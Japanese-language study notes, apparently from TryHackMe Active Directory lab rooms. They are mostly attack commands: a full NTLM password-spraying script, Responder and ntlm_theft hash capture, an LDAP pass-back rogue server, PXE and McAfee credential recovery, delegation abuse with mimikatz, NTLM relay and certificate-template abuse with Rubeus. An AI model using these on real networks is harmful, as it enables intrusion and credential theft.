# AD 侵入

https://tryhackme.com/room/exploitingad

## NetNTLM

### パスワードスプレー攻撃の例

（出展）https://tryhackme.com/r/room/breachingad

```shell
$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])

```

### NetNTLM チャレンジの傍受

この操作は、通常のネットワーク試行が失敗するようになり混乱を引き起こす（意図したホストや共有に接続できなくなる）ため、使用には注意が必要。

Responder（LLMNR、NBT-NS、および MDNS ポイズナー）

https://github.com/lgandx/Responder

NIC を指定して傍受を開始

```shell
sudo responder -I <network-if>
```

NTLMv2-SSP ハッシュのクラック（ユーザー名含む全体）

```shell
hashcat -m 5600 <hash file> <password file> --force
```

### ntlm_theft

https://github.com/Greenwolf/ntlm_theft

複数の種類の NTLMv2 ハッシュ盗難ファイルを生成するツール

SMBにファイルを配置できるとき、アクセスした人のNTLMハッシュをResponderで盗聴する。

```sh
pip3 install xlsxwriter
```

```sh
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft

python3 ntlm_theft.py -g all -s <listen-ip> -f test
```

## LDAP

### LDAP パスバック攻撃

プリンターなどの Web インターフェースで、LDAP サーバーの IP アドレスを自分の IP アドレスに変更できる場合などを想定。LDAP サーバーへ送信される認証情報を盗む。通常は暗号化されるので、認証メカニズムをダウングレードした LDAP サーバーを用意する。

#### 不正 LDAP サーバーのホスティング

インストール

```shell
sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

サーバー構成

```shell
# No を選択
sudo dpkg-reconfigure -p low slapd
```

- ドメイン名
- 組織名（ドメイン名と同じで可）
- 管理者パスワード
- データベースが消去時に削除されないように、No
- 新しい DB ファイルを作成する前に、古い DB ファイルを移動する、Yes

サポート認証メカニズムをダウングレードして脆弱にするパッチ

```text
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

パッチ適用

```shell
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

確認

```shell
$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```

LDAP サーバーへのリクエストを傍受

```shell
$ sudo tcpdump -SX -i breachad tcp port 389
```

## Microsoft Deployment Toolkit (MDT)

### PXE ブートイメージ

ブートイメージの取得  
https://github.com/wavestone-cdt/powerpxe

通常、MDT サーバーの IP と、BCD ファイル名は DHCP サーバーから取得する。

```ps
# BCDファイルの取得
tftp -i 10.200.55.202 GET "\Tmp\x64{7111EBDE-3818-4BF2-834B-56787204088C}.bcd" conf.bcd

powershell -executionpolicy bypass

# BCDファイルからブートイメージのパスを取得
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim

# ブートイメージの取得
tftp -i 10.200.55.202 GET \Boot\x64\Images\LiteTouchPE_x64.wim pxeboot.wim
```

PXE ブート イメージから資格情報を回復

```ps
Get-FindCredentials -WimFile pxeboot.wim

>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```

## 構成ファイル

自動化ツール  
https://github.com/GhostPack/Seatbelt

### McAfee Enterprise Endpoint Security

インストール中にオーケストレーターに接続するために使用する資格情報が ma.db ファイルに埋め込まれている。

```ps
# ma.db を kaliにコピー
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .

# データを閲覧するデータを閲覧する
sqlitebrowser ma.db
```

AGENT_REPOSITORIES テーブル

```text
domain: za.tryhackme.com
auth_user: svcAV
auth_password: jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

McAfee は auth_password を既知のキーで暗号化しているため、ツールで複合可能。

https://github.com/funoverip/mcafee-sitelist-pwd-decryption

```shell
$ python ./mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```

## 委任

### 権限委任

ACE とそのエクスプロイト方法一覧  
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#

| 権限                    | 説明                                                                                                                                                                             |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ForceChangePassword** | ユーザーの現在のパスワードを知らなくても、現在のパスワードを設定できる。                                                                                                         |
| **AddMembers**          | ユーザー (自分のアカウントを含む)、グループ、またはコンピューターを対象グループに追加できる。                                                                                    |
| **GenericAll**          | ユーザーのパスワードを変更したり、SPN を登録したり、ターゲット グループに AD オブジェクトを追加したりする機能を含め、オブジェクトを完全に制御できる。                            |
| **GenericWrite**        | ターゲット オブジェクトの保護されていないパラメータを更新できる。これにより、たとえば、scriptPath パラメータを更新して、ユーザーが次にログオンしたときにスクリプトを実行できる。 |
| **WriteOwner**          | 対象オブジェクトの所有者を更新できる。自分自身を所有者にすることで、オブジェクトに対する追加の権限を取得できる。                                                                 |
| **WriteDACL**           | ターゲット オブジェクトの DACL に新しい ACE を書き込める。たとえば、アカウントにターゲット オブジェクトに対する完全な制御を許可する ACE を書き込める。                           |
| **AllExtendedRights**   | 対象オブジェクトに対して拡張 AD 権限に関連付けられた任意のアクションを実行できる。これには、たとえば、ユーザーのパスワードを強制的に変更できる機能が含まれる。                   |

### Kerberos 委任

Kerberos 委任の実際の使用法は、アプリケーションが別のサーバーでホストされているリソースにアクセスできるようにすること

### リソースベースの制限付き委任

どのオブジェクトがどのサービスに委任できるかを指定する代わりに、サービスがどのオブジェクトが委任できるかを指定する。これにより、サービス所有者は誰がアクセスできるかを制御できる。

例：svcIIS アカウントは THMSERVER1 上の HTTP および WSMAN サービスを委任できる。

msDS-AllowedToActOnBehalfOfOtherIdentity 属性に注目。

```ps
PS C:\Tools> Get-NetUser -TrustedToAuth

logoncount               : 37
badpasswordtime          : 2/5/2025 12:37:07 AM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 2/5/2025 12:07:54 AM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 2/5/2025 12:07:54 AM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,
                           http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 2/5/2025 1:44:29 AM
badpwdcount              : 0
cn                       : IIS Server
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 172105
```

```ps
# svcIIS のパスワードを表示
mimikatz # token::elevate
mimikatz # lsadump::secrets

# TGTを生成
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:<password>

# TGS 要求を偽造
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

# インポート。（新しいmimikatzインスタンスで）
mimikatz # privilege::debug
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# t1_trevor.jones として thmserver1 にログイン
PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
PS C:> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

## 自動リレー

### マシンアカウント

AD には、あるマシンが別のマシンに対して管理者権限を持つという例外的なケースがある。

Bloodhound のカスタムクエリ

```text
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

### 認証リレー

```shell
# SMB署名が強制されていないことを確認
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc

# NTLMリレーを設定（リッスン）
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug

# THMSERVER2 に認証を強制
SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"

# 例
python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
```

## AD 証明書

```shell
# 証明書を列挙
certutil -Template -v > templates.txt
```

有害な証明書テンプレート設定の組み合わせの例

- クライアント認証- 証明書はクライアント認証に使用できる。
- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - 証明書テンプレートを使用すると、サブジェクト別名 (SAN) を指定できる。
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - 証明書は秘密キーとともにエクスポート可能になる。
- 証明書のアクセス許可- 証明書テンプレートを使用するために必要なアクセス許可がある。

mmc（GUI）でテンプレートを使って証明書を作成し、秘密鍵とともに証明書をエクスポートした後

```shell
# TGT要求
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>

# TGTをロード
mimikatz # privilege::debug
mimikatz # kerberos::ptt administrator.kirbi
mimikatz # exit
```
